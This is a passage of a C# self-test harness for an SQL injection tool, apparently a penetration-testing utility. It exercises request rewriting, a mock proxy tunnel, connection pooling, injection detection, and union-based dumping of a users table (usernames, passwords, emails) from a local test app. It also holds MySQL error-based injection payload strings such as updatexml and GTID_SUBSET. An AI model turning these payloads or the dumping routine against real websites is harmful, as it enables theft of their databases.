    bool ok4 = multi.StartsWith("POST /JVApp/mysql.jsp HTTP/1.1")
               && boundary.Length > 0
               && multiBody.Contains($"--{boundary}\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1<*>")
               && multiBody.Contains("name=\"name\"\r\n\r\nabc")
               && multiBody.TrimEnd().EndsWith($"--{boundary}--")
               && multi.Contains($"Content-Length: {System.Text.Encoding.UTF8.GetByteCount(multiBody)}");
    Check("POST JSON->multipart（boundary+字段+CL正确）", ok4);

    //5. multipart -> GET：复杂格式参数可回转（往返一致性）
    string roundGet = RequestRewriter.ChangeRequestFormat(multi, SuperSQLInjectionV2.Tools.Http.RequestFormat.GET);
    bool ok5 = roundGet.StartsWith("GET /JVApp/mysql.jsp?id=1<*>&name=abc HTTP/1.1");
    Check("multipart->GET（往返参数一致）", ok5, roundGet.Split("\r\n")[0]);

    //6. multipart -> POST JSON：复杂格式直转JSON
    string multi2json = RequestRewriter.ChangeRequestFormat(multi, SuperSQLInjectionV2.Tools.Http.RequestFormat.POST_JSON);
    bool ok6 = multi2json.Contains("\"id\":\"1<*>\"");
    Check("multipart->POST JSON", ok6);

    //7. 无参数GET转POST表单：空body不炸
    string noParam = RequestRewriter.ChangeRequestFormat("GET /a/b HTTP/1.1\r\nHost: x\r\n\r\n", SuperSQLInjectionV2.Tools.Http.RequestFormat.POST_FORM);
    bool ok7 = noParam.StartsWith("POST /a/b HTTP/1.1") && noParam.Contains("Content-Length: 0");
    Check("无参数GET->POST表单（空body容错）", ok7);

    //8. 尾部换行回归：编辑器粘贴报文带尾部\r\n，转GET后请求行不得含换行
    string trailing = "POST /x HTTP/1.1\r\nHost: h\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nid=1&name=abc\r\n";
    string g8 = RequestRewriter.ChangeRequestFormat(trailing, SuperSQLInjectionV2.Tools.Http.RequestFormat.GET);
    string line8 = g8.Split("\r\n")[0];
    bool ok8 = line8 == "GET /x?id=1&name=abc HTTP/1.1";
    Check("尾部换行POST->GET（请求行无裸换行）", ok8, line8);

    //9. JSON值含换行转表单：成帧安全（剥离裸CR/LF；JSON文本中为合法\n转义序列）
    string jsonNl = RequestRewriter.ChangeRequestFormat("POST /x HTTP/1.1\r\nHost: h\r\nContent-Type: application/json\r\nContent-Length: 22\r\n\r\n{\"a\":\"1\\n2\",\"b\":\"v\"}", SuperSQLInjectionV2.Tools.Http.RequestFormat.POST_FORM);
    string bodyNl = jsonNl.Substring(jsonNl.IndexOf("\r\n\r\n") + 4);
    bool ok9 = !bodyNl.Contains("\n") && bodyNl.Contains("a=12");
    Check("JSON含换行值->POST表单（成帧安全）", ok9, bodyNl);

    Console.WriteLine($"===== 报文转换自检结果: PASS={pass} FAIL={fail} =====");
}

//日志行级着色器自检：验证追加/多行/头部裁剪/清空下行号与级别的映射一致性（不依赖UI线程）
static void LogTest()
{
    Console.WriteLine("===== 日志行级着色自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    var doc = new AvaloniaEdit.Document.TextDocument();
    var cz = new SuperSQLInjectionV2.Tools.LogLineColorizer();
    //复刻LogTools.AppendToEditor的核心逻辑
    void Append(string log, SuperSQLInjectionV2.Tools.LogLevel lv)
    {
        int start = doc.LineCount - 1;
        string t = log + "\r\n";
        doc.Insert(doc.TextLength, t);
        int n = t.Split('\n').Length - 1;
        for (int i = 0; i < n; i++) cz.SetLineLevel(start + i, lv);
    }

    Append("普通信息", SuperSQLInjectionV2.Tools.LogLevel.Info);
    Append("存在报错注入payload：updatexml...", SuperSQLInjectionV2.Tools.LogLevel.Success);
    Append("异常第一行\r\n异常第二行", SuperSQLInjectionV2.Tools.LogLevel.Error);

    //1. 行级别映射：行0=Info 行1=Success 行2/3=Error
    bool ok1 = cz.GetLineLevel(0) == SuperSQLInjectionV2.Tools.LogLevel.Info
               && cz.GetLineLevel(1) == SuperSQLInjectionV2.Tools.LogLevel.Success
               && cz.GetLineLevel(2) == SuperSQLInjectionV2.Tools.LogLevel.Error
               && cz.GetLineLevel(3) == SuperSQLInjectionV2.Tools.LogLevel.Error;
    Check("追加后行级别映射（含多行消息）", ok1);

    //2. 多行消息与文档行内容对齐
    bool ok2 = doc.GetLineByNumber(3).ToString ()!= null
               && doc.Text.Contains("异常第二行");
    Check("多行消息写入文档", ok2);

    //3. 头部裁剪一行后级别同步前移
    var first = doc.GetLineByNumber(1);
    doc.Remove(0, first.TotalLength);
    cz.RemoveFirstLines(1);
    bool ok3 = cz.GetLineLevel(0) == SuperSQLInjectionV2.Tools.LogLevel.Success
               && cz.GetLineLevel(1) == SuperSQLInjectionV2.Tools.LogLevel.Error
               && cz.GetLineLevel(2) == SuperSQLInjectionV2.Tools.LogLevel.Error;
    Check("头部裁剪后级别同步前移", ok3);

    //4. 裁剪后继续追加，新行级别正确
    Append("新的高亮日志", SuperSQLInjectionV2.Tools.LogLevel.Highlight);
    int hlLine = doc.LineCount - 2; //新追加行
    bool ok4 = cz.GetLineLevel(hlLine) == SuperSQLInjectionV2.Tools.LogLevel.Highlight;
    Check("裁剪后继续追加级别正确", ok4);

    //5. 清空后级别记录归零
    doc.Text = "";
    cz.Clear();
    bool ok5 = cz.GetLineLevel(0) == SuperSQLInjectionV2.Tools.LogLevel.Info && doc.LineCount == 1;
    Check("清空后级别记录归零", ok5);

    Console.WriteLine($"===== 日志着色自检结果: PASS={pass} FAIL={fail} =====");
}

//连接池自检：验证Keep-Alive连接复用（第二次请求应租用到池化连接而非新建）
static async Task PoolTest()
{
    Console.WriteLine("===== 连接池自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.Clear();
    var config = new AppConfig();
    config.Url = $"http://127.0.0.1:{twaPort}/num?db=sqlite&id=1";
    config.TimeOut = 5;
    string raw = $"GET /num?db=sqlite&id=1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\n\r\n";
    string poolKey = $"127.0.0.1:{twaPort}:False";

    //1. 首次请求：新建连接
    var req1 = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
    var resp1 = SuperSQLInjectionV2.Tools.Http.HTTPTool.sendRequestRetry(req1);
    Check("首次请求成功", resp1.StatusCode == 200, $"status={resp1.StatusCode} time={resp1.RunTime}ms");

    //2. 响应完整读取后连接应已归还池
    var pooled = await SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.RentAsync(poolKey, CancellationToken.None);
    Check("连接已归还池（keep-alive复用前提成立）", pooled != null);
    if (pooled != null) SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.Return(pooled);

    //3. 连续5次请求：池化复用下耗时应远低于新建连接（本地回环也应有可观差异且全部成功）
    long totalMs = 0;
    int okCount = 0;
    for (int i = 0; i < 5; i++)
    {
        var req = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
        var resp = SuperSQLInjectionV2.Tools.Http.HTTPTool.sendRequestRetry(req);
        totalMs += resp.RunTime;
        if (resp.StatusCode == 200) okCount++;
    }
    Check("连续5请求全部成功", okCount == 5, $"ok={okCount}/5 总耗时={totalMs}ms 平均={totalMs / 5}ms");

    //4. 响应body完整性（连接复用后body不错乱）
    bool ok4 = resp1.BodyTxt != null && resp1.BodyTxt.Contains("数字型注入点");
    Check("响应body完整", ok4);

    Console.WriteLine($"===== 连接池自检结果: PASS={pass} FAIL={fail} =====");
}

//HTTP代理协议自检（P1-1）：迷你代理模拟器验证 absolute-form 请求行改写 + CONNECT 隧道握手 + Proxy-Authorization
static async Task ProxyTunnelTest()
{
    Console.WriteLine("===== HTTP代理隧道自检（absolute-form / CONNECT / Proxy-Authorization）=====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    int proxyPort = 18991;
    string? absFormLine = null, absFormHead = null, connectLine = null, connectHead = null;
    int clientHelloCount = 0;
    var listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, proxyPort);
    listener.Start();
    using var cts = new CancellationTokenSource();
    var serverTask = Task.Run(async () =>
    {
        while (!cts.IsCancellationRequested)
        {
            System.Net.Sockets.TcpClient client;
            try { client = await listener.AcceptTcpClientAsync(cts.Token); }
            catch { break; }
            _ = Task.Run(async () =>
            {
                try
                {
                    var stream = client.GetStream();
                    //逐字节读至 \r\n\r\n（模拟器场景报文极小，性能无所谓）
                    var ms = new MemoryStream();
                    int matched = 0;
                    byte[] term = { 13, 10, 13, 10 };
                    byte[] one = new byte[1];
                    while (matched < 4 && ms.Length < 65536)
                    {
                        int n = await stream.ReadAsync(one, 0, 1);
                        if (n <= 0) return;
                        ms.WriteByte(one[0]);
                        matched = one[0] == term[matched] ? matched + 1 : (one[0] == term[0] ? 1 : 0);
                    }
                    string head = System.Text.Encoding.ASCII.GetString(ms.ToArray());
                    string firstLine = head.Split("\r\n")[0];
                    if (firstLine.StartsWith("CONNECT ", StringComparison.OrdinalIgnoreCase))
                    {
                        connectLine = firstLine;
                        connectHead = head;
                        byte[] ok = System.Text.Encoding.ASCII.GetBytes("HTTP/1.1 200 Connection Established\r\n\r\n");
                        await stream.WriteAsync(ok, 0, ok.Length);
                        //隧道建立后客户端应立即开始TLS握手：读3字节验证ClientHello记录头（0x16 0x03）
                        byte[] hello = new byte[3];
                        int got = 0;
                        while (got < 3)
                        {
                            int n = await stream.ReadAsync(hello, got, 3 - got);
                            if (n <= 0) break;
                            got += n;
                        }
                        if (got == 3 && hello[0] == 0x16 && hello[1] == 0x03)
                        {
                            Interlocked.Increment(ref clientHelloCount);
                        }
                    }
                    else
                    {
                        absFormLine = firstLine;
                        absFormHead = head;
                        string body = "proxy-ok";
                        byte[] resp = System.Text.Encoding.ASCII.GetBytes(
                            "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: " + body.Length
                            + "\r\nConnection: close\r\n\r\n" + body);
                        await stream.WriteAsync(resp, 0, resp.Length);
                    }
                }
                catch { }
                finally { try { client.Close(); } catch { } }
            });
        }
    });

    try
    {
        SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.Clear();
        var config = new AppConfig();
        config.TimeOut = 8;
        config.RetryCount = 1;
        config.ProxyConfig.ProxyEnable = true;
        config.ProxyConfig.ProxyItems.Add(new Proxy
        {
            Host = "127.0.0.1",
            Port = proxyPort,
            proxyType = "HTTP",
            IsEnabled = true,
            IsOk = true,
            username = "u1",
            password = "p1"
        });

        //A：HTTP目标 → 请求行必须改 absolute-form，带 Proxy-Authorization（u1:p1 → dTE6cDE=）
        config.Url = "http://127.0.0.1:18092/num?db=sqlite&id=1";
        var reqA = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config,
            "GET /num?db=sqlite&id=1 HTTP/1.1\r\nHost: 127.0.0.1:18092\r\n\r\n");
        var respA = SuperSQLInjectionV2.Tools.Http.HTTPTool.sendRequestRetry(reqA);
        Check("HTTP经代理请求成功", respA.StatusCode == 200 && respA.BodyTxt.Contains("proxy-ok"),
            $"status={respA.StatusCode}");
        Check("请求行已改absolute-form（含非默认端口）",
            absFormLine == "GET http://127.0.0.1:18092/num?db=sqlite&id=1 HTTP/1.1",
            absFormLine ?? "代理未收到请求");
        Check("HTTP请求携带Proxy-Authorization",
            absFormHead != null && absFormHead.Contains("Proxy-Authorization: Basic dTE6cDE="));

        //B：HTTPS目标 → 先CONNECT建隧道，隧道上应立即开始TLS握手（代理收到ClientHello）
        var configB = new AppConfig();
        configB.TimeOut = 8;
        configB.RetryCount = 1;
        configB.ProxyConfig.ProxyEnable = true;
        configB.ProxyConfig.ProxyItems.Add(new Proxy
        {
            Host = "127.0.0.1",
            Port = proxyPort,
            proxyType = "HTTP",
            IsEnabled = true,
            IsOk = true,
            username = "u1",
            password = "p1"
        });
        configB.Url = "https://secure.test.local:18443/login";
        var reqB = new SuperSQLInjectionV2.Tools.Http.HttpRequest(configB,
            "GET /login HTTP/1.1\r\nHost: secure.test.local:18443\r\n\r\n");
        var respB = SuperSQLInjectionV2.Tools.Http.HTTPTool.sendRequestRetry(reqB);
        Check("HTTPS目标隧道对端无TLS服务→按预期失败", respB.StatusCode == 0, $"status={respB.StatusCode}");
        Check("代理收到CONNECT请求行",
            connectLine == "CONNECT secure.test.local:18443 HTTP/1.1", connectLine ?? "未收到CONNECT");
        Check("CONNECT携带Proxy-Authorization",
            connectHead != null && connectHead.Contains("Proxy-Authorization: Basic dTE6cDE="));
        Check("隧道建立后客户端立即发起TLS握手（ClientHello）", clientHelloCount > 0,
            $"hello次数={clientHelloCount}");

        //C：直连回归——关闭代理后直连TestWebApp不受影响
        config.ProxyConfig.ProxyEnable = false;
        config.Url = $"http://127.0.0.1:{twaPort}/num?db=sqlite&id=1";
        var reqC = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config,
            $"GET /num?db=sqlite&id=1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\n\r\n");
        var respC = SuperSQLInjectionV2.Tools.Http.HTTPTool.sendRequestRetry(reqC);
        Check("关代理直连回归", respC.StatusCode == 200, $"status={respC.StatusCode}");
    }
    finally
    {
        cts.Cancel();
        listener.Stop();
        try { await serverTask; } catch { }
    }
    Console.WriteLine($"===== HTTP代理隧道自检结果: PASS={pass} FAIL={fail} =====");
}

//协议层自检（P4）：Accept-Encoding能力对齐重写 / br解码 / 302跟随深度 / 连接池复用
static async Task ProtocolTest()
{
    Console.WriteLine("===== 协议层自检（AE重写/br解码/302跟随/连接池）=====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.Clear();

    //1. Accept-Encoding规范重写：服务端应看到 gzip, deflate, br（P1①）
    {
        var config = new AppConfig();
        config.Url = $"http://127.0.0.1:{twaPort}/echo-ae";
        config.TimeOut = 5;
        string raw = $"GET /echo-ae HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nAccept-Encoding: identity\r\nConnection: close\r\n\r\n";
        var req = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
        var resp = await SuperSQLInjectionV2.Tools.Http.HTTPTool.SendRequestRetryAsync(req);
        string ae = (resp.BodyTxt ?? "").Trim().Replace(" ", "");
        Check("Accept-Encoding规范重写", ae.Equals("gzip,deflate,br", StringComparison.OrdinalIgnoreCase), $"server saw: {ae}");
    }

    //2. 无AE头时不新增（仅原位重写，不改变原始请求形态）
    {
        var config = new AppConfig();
        config.Url = $"http://127.0.0.1:{twaPort}/echo-ae";
        config.TimeOut = 5;
        string raw = $"GET /echo-ae HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nConnection: close\r\n\r\n";
        var req = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
        var resp = await SuperSQLInjectionV2.Tools.Http.HTTPTool.SendRequestRetryAsync(req);
        string ae = (resp.BodyTxt ?? "").Trim();
        Check("无AE头不新增", ae.Length == 0, $"server saw: '{ae}'");
    }

    //3. br解码：/br返回Brotli压缩体，客户端应解码为明文（P1②）
    {
        var config = new AppConfig();
        config.Url = $"http://127.0.0.1:{twaPort}/br";
        config.TimeOut = 5;
        string raw = $"GET /br HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: close\r\n\r\n";
        var req = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
        var resp = await SuperSQLInjectionV2.Tools.Http.HTTPTool.SendRequestRetryAsync(req);
        string body = resp.BodyTxt ?? "";
        Check("Brotli(br)响应解码", body.Contains("BROTLI-OK-超级SQL注入工具V2"), $"body='{Truncate(body, 40)}'");
    }

    //4. 302跟随：FollowRedirect=true时 /redir1 经 /redir2 最终拿到pong；false时返回302原状态
    {
        var config = new AppConfig();
        config.Url = $"http://127.0.0.1:{twaPort}/redir1";
        config.TimeOut = 5;
        config.FollowRedirect = true;
        string raw = $"GET /redir1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nConnection: close\r\n\r\n";
        var req = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
        var resp = await SuperSQLInjectionV2.Tools.Http.HTTPTool.SendRequestRetryAsync(req);
        Check("302跟随到最终页", resp.StatusCode == 200 && (resp.BodyTxt ?? "").Contains("pong"), $"status={resp.StatusCode} body='{Truncate(resp.BodyTxt ?? "", 30)}'");

        config.FollowRedirect = false;
        var req2 = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
        var resp2 = await SuperSQLInjectionV2.Tools.Http.HTTPTool.SendRequestRetryAsync(req2);
        Check("302不跟随返回原状态", resp2.StatusCode == 302, $"status={resp2.StatusCode}");
    }

    //5. 连接池复用：keep-alive请求完成后连接归还池可再次Rent
    {
        var config = new AppConfig();
        config.Url = $"http://127.0.0.1:{twaPort}/ping";
        config.TimeOut = 5;
        string raw = $"GET /ping HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nConnection: keep-alive\r\n\r\n";
        var req = new SuperSQLInjectionV2.Tools.Http.HttpRequest(config, raw);
        var resp = await SuperSQLInjectionV2.Tools.Http.HTTPTool.SendRequestRetryAsync(req);
        string poolKey = $"127.0.0.1:{twaPort}:False";
        var pooled = await SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.RentAsync(poolKey, CancellationToken.None);
        Check("连接归还池(keep-alive复用)", resp.StatusCode == 200 && pooled != null, $"status={resp.StatusCode} pooled={(pooled != null)}");
        if (pooled != null) SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.Return(pooled);
    }

    Console.WriteLine($"===== 协议层自检结果: PASS={pass} FAIL={fail} =====");
}

//Union批量取数自检（Q3）：mysql/sqlite users表，批量(10行/请求)与逐行(1行/请求)结果一致且请求数显著下降
static async Task UnionBatchTest()
{
    Console.WriteLine("===== Union批量取数自检（Q3）=====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    foreach (string db in new[] { "mysql", "sqlite" })
    {
        var config = new AppConfig();
        Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
        config.Host = "127.0.0.1";
        config.Port = twaPort;
        config.IsSSL = false;
        config.TimeOut = 15;
        string reqTxt = $"GET /num?db={db}&id=1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nUser-Agent: SuperSQLInjectionV2-TestHarness\r\nAccept: */*\r\nConnection: close\r\n\r\n";
        List<InjectPoint> hits = await InjectDetectEngine.DetectParam(config, reqTxt, "id", "1") ?? new List<InjectPoint>();
        var union = hits.FirstOrDefault(h => h.InjectType == InjectType.Union);
        if (union == null)
        {
            Console.WriteLine($"[{db}] FAIL: 未检出Union通道");
            fail++;
            continue;
        }
        DBType dbType = db == "mysql" ? DBType.MySQL : DBType.SQLite;
        config.DataConfig.SelectedInjectType = InjectType.Union;
        config.DataConfig.SelectedDBType = dbType;
        config.DataConfig.ShowColumnIndex = union.ShowColumnIndex;
        config.DataConfig.SumColumnCount = union.SumColumnCount;
        config.RequestTxt = union.RequestTxt;
        PayloadFactory.Init(dbType);

        string dbName = db == "mysql" ? "sqli_test" : "";
        var columns = new List<string> { "id", "username", "password", "email" };
        var rows = new List<string>();
        var recipient = new object();
        WeakReferenceMessenger.Default.Register<AddRowDataMsg>(recipient, (r, m) =>
        {
            rows.Add(string.Join("|", columns.Select(c => m.Data[c] ?? "")));
        });

        async Task<List<string>> DumpOnce(int batch)
        {
            rows.Clear();
            config.DataConfig.UnionBatchRows = batch;
            config.DataDump.DataDumpStart = 0;
            config.DataDump.DumpCount = 3; //语义=读到第N行（users种子3行）
            var dt = new SuperSQLInjectionV2.ViewModels.Tools.DataTools(dbName, "users", columns);
            await dt.GetDataUnion(config);
            return new List<string>(rows);
        }

        //逐行基线（1行/请求）
        long before1 = Interlocked.Read(ref config.RequestTmpCount);
        List<string> rowsSingle = await DumpOnce(1);
        long reqsSingle = Interlocked.Read(ref config.RequestTmpCount) - before1;

        //批量（10行/请求，聚合一次回显）
        long before2 = Interlocked.Read(ref config.RequestTmpCount);
        List<string> rowsBatch = await DumpOnce(10);
        long reqsBatch = Interlocked.Read(ref config.RequestTmpCount) - before2;

        WeakReferenceMessenger.Default.Unregister<AddRowDataMsg>(recipient);

        Check($"[{db}] 批量与逐行行集一致", rowsSingle.Count > 0 && rowsSingle.SequenceEqual(rowsBatch),
            $"逐行{rowsSingle.Count}行/批量{rowsBatch.Count}行 首行=[{(rowsBatch.Count > 0 ? Truncate(rowsBatch[0], 50) : "")}]");
        Check($"[{db}] 批量请求数显著下降", reqsBatch < reqsSingle, $"逐行={reqsSingle} 批量={reqsBatch}");
    }
    Console.WriteLine($"===== Union批量自检结果: PASS={pass} FAIL={fail} =====");
}

//用例命中计数验证：sqlite全技术真实检测 → 校验hit_count.json计数与检出点一一对应、LoadAll合并一致
static async Task HitCountTest()
{
    Console.WriteLine("===== 用例命中计数自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    string hitFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "config", "injection", "hit_count.json");
    if (File.Exists(hitFile))
    {
        File.Delete(hitFile);
    }

    var config = new AppConfig();
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    config.IsSSL = false;
    config.TimeOut = 15;
    //级别/风险可用环境变量覆盖（默认用DataConfig内置默认值）：SQLI_TEST_LEVEL / SQLI_TEST_RISK
    if (int.TryParse(Environment.GetEnvironmentVariable("SQLI_TEST_LEVEL"), out int lv))
    {
        config.DataConfig.DetectLevel = lv;
    }
    if (int.TryParse(Environment.GetEnvironmentVariable("SQLI_TEST_RISK"), out int rk))
    {
        config.DataConfig.DetectRisk = rk;
    }
    string reqTxt = $"GET /num?db=sqlite&id=1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nUser-Agent: SuperSQLInjectionV2-TestHarness\r\nAccept: */*\r\nConnection: close\r\n\r\n";
    List<InjectPoint> hits = await InjectDetectEngine.DetectParam(config, reqTxt, "id", "1") ?? new List<InjectPoint>();

    Check("sqlite检出注入点", hits.Count > 0, $"命中{hits.Count}个：" + string.Join(",", hits.Select(h => h.InjectType)));
    Check("命中计数文件已生成", File.Exists(hitFile));
    var counts = File.Exists(hitFile)
        ? System.Text.Json.JsonSerializer.Deserialize<Dictionary<string, int>>(File.ReadAllText(hitFile)) ?? new Dictionary<string, int>()
        : new Dictionary<string, int>();
    int sum = counts.Values.Sum();
    foreach (var kv in counts)
    {
        Console.WriteLine($"  计数：{kv.Key} = {kv.Value}");
    }
    Check("计数总量与检出点数一致", sum == hits.Count, $"计数{sum} vs 检出{hits.Count}");

    //LoadAll合并验证：对应用例HitCount与持久化文件一致
    var items = SuperSQLInjectionV2.Tools.Inject.InjectPayloadManager.LoadAll();
    int mism = counts.Count(kv =>
    {
        var parts = kv.Key.Split('|');
        var it = items.FirstOrDefault(x => x.FileName == parts[0] && x.Title == parts[1]);
        return it == null || it.HitCount != kv.Value;
    });
    Check("LoadAll合并命中次数一致", mism == 0, $"{counts.Count}条计数 {mism}条不一致");
    Console.WriteLine($"===== 命中计数自检结果: PASS={pass} FAIL={fail} =====");
}

//报文格式转换问题复现（真实浏览器粘贴场景：完整头+尾部换行）
static void FmtReproTest()
{
    Console.WriteLine("===== 报文转换问题复现 =====");
    //浏览器复制的真实GET报文（末尾通常带一个空行/换行）
    string getReq = "GET /JVApp/mysql.jsp?id=1&name=abc HTTP/1.1\r\n" +
        "Host: 127.0.0.1:8090\r\n" +
        "Connection: keep-alive\r\n" +
        "User-Agent: Mozilla/5.0\r\n" +
        "Accept: text/html\r\n" +
        "Cookie: JSESSIONID=ABC123\r\n" +
        "\r\n";
    string postForm = RequestRewriter.ChangeRequestFormat(getReq, SuperSQLInjectionV2.Tools.Http.RequestFormat.POST_FORM);
    Console.WriteLine("---- GET->POST表单 ----");
    Console.WriteLine(postForm.Replace("\r\n", "\r\n\n"));
    Console.WriteLine("---- POST表单->GET 往返 ----");
    string backGet = RequestRewriter.ChangeRequestFormat(postForm, SuperSQLInjectionV2.Tools.Http.RequestFormat.GET);
    Console.WriteLine(backGet.Replace("\r\n", "\r\n\n"));
    //带尾部换行的POST表单（编辑器文本常带尾部\r\n）
    string postTrailing = postForm + "\r\n";
    string g2 = RequestRewriter.ChangeRequestFormat(postTrailing, SuperSQLInjectionV2.Tools.Http.RequestFormat.GET);
    Console.WriteLine("---- 尾部换行POST->GET ----");
    Console.WriteLine(g2.Replace("\r\n", "\r\n\n"));
}

//报错方式变体机制自检：模板ErrorData@行解析、下拉切换实时替换报错触发函数
static void ErrorMethodTest()
{
    Console.WriteLine("===== 报错方式变体自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}");
        if (ok) pass++; else fail++;
    }

    //MySQL模板：4个变体
    PayloadFactory.Init(DBType.MySQL);
    var bp = PayloadFactory.BasePayload;
    Check("MySQL变体数量=4", bp.ErrorDataVariants.Count == 4);
    Check("含UpdateXml/ExtractValue/FloorRand/GtidSubset",
        bp.ErrorDataVariants.ContainsKey("UpdateXml") &&
        bp.ErrorDataVariants.ContainsKey("ExtractValue") &&
        bp.ErrorDataVariants.ContainsKey("FloorRand") &&
        bp.ErrorDataVariants.ContainsKey("GtidSubset"));
    Check("默认ErrorData=updatexml", bp.ErrorData.StartsWith("updatexml"));

    Check("切换ExtractValue生效", bp.SetErrorMethod("ExtractValue") && bp.ErrorData.StartsWith("extractvalue"));
    Check("切换FloorRand生效", bp.SetErrorMethod("FloorRand") && bp.ErrorData.Contains("floor(rand(0)*2)"));
    Check("不存在的方法返回false且保持不变", !bp.SetErrorMethod("NotExist") && bp.ErrorData.Contains("floor(rand(0)*2)"));
    Check("恢复默认", bp.SetErrorMethod(BasePayload.DefaultErrorMethodName) && bp.ErrorData.StartsWith("updatexml"));
    Check("SetErrorMethod(null)恢复默认", bp.SetErrorMethod(null) && bp.ErrorData.StartsWith("updatexml"));

    //取数链路实际使用切换后的触发函数
    bp.SetErrorMethod("ExtractValue");
    string errPayload = PayloadFactory.BPTool.ErrorData("user()");
    Check("ErrorData()取数用extractvalue包装", errPayload.StartsWith("extractvalue") && errPayload.Contains("user()"));
    bp.SetErrorMethod(BasePayload.DefaultErrorMethodName);
    errPayload = PayloadFactory.BPTool.ErrorData("user()");
    Check("恢复后取数用updatexml包装", errPayload.StartsWith("updatexml"));

    //无变体的库（sqlite）：下拉里只有默认
    PayloadFactory.Init(DBType.SQLite);
    Check("SQLite无变体", PayloadFactory.BasePayload.ErrorDataVariants.Count == 0);
    Check("SQLite切默认正常", PayloadFactory.BasePayload.SetErrorMethod(BasePayload.DefaultErrorMethodName));

    Console.WriteLine($"===== 报错方式自检结果: PASS={pass} FAIL={fail} =====");
}

static void ReflectTest()
{
    Console.WriteLine("===== 回显剔除 + 注释符联动自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}");
        if (ok) pass++; else fail++;
    }

    // ---- 1. StripPayloadReflection 三种回显形态 ----
    string payload = "AND GTID_SUBSET(CONCAT('0x7176726a71',(SELECT (ELT(25426=25426,1))),'0x6a7a7a71'),25426)";
    string echoed = "<html>SQL: select * from t where id=1 " + payload + "<br/>"
        + "enc: " + Uri.EscapeDataString(payload) + "<br/>"
        + "html: " + System.Net.WebUtility.HtmlEncode(payload) + "<br/>"
        + "Error: 0x7176726a71ROOT0x6a7a7a71</html>";
    string stripped = InjectTools.StripPayloadReflection(echoed, payload);
    Check("原文回显被剔除", !stripped.Contains("GTID_SUBSET"));
    Check("URL编码回显被剔除", !stripped.Contains("ELT%2825426"));
    Check("HTML编码回显被剔除", !stripped.Contains("&#x27;0x7176726a71"));
    Check("真实报错结果保留", stripped.Contains("0x7176726a71ROOT0x6a7a7a71"));

    // ---- 2. ParseUnionOrErrorData 回显污染 ----
    PayloadFactory.Init(DBType.MySQL);
    //正常：报错输出中的标记数据
    var resp1 = new HttpResponse(new AppConfig()) { Body = System.Text.Encoding.UTF8.GetBytes("<html>XPATH syntax error: '~data__s_p_root_s_p__data~'</html>") };
    Check("无污染正常提取", DataComm.ParseUnionOrErrorData(resp1, "updatexml(1,concat(0x7e,(user()),0x7e),1)") == "root");
    //污染：页面先回显了含标记字面量的payload（自定义模板/回显场景），真实结果在后
    string dirtyPayload = "updatexml(1,concat(0x7e,('data__s_p_FAKE_s_p__data'),0x7e),1)";
    var resp2 = new HttpResponse(new AppConfig()) { Body = System.Text.Encoding.UTF8.GetBytes("<html>SQL: ... and " + dirtyPayload + " -- <br/>XPATH syntax error: '~data__s_p_root_s_p__data~'</html>") };
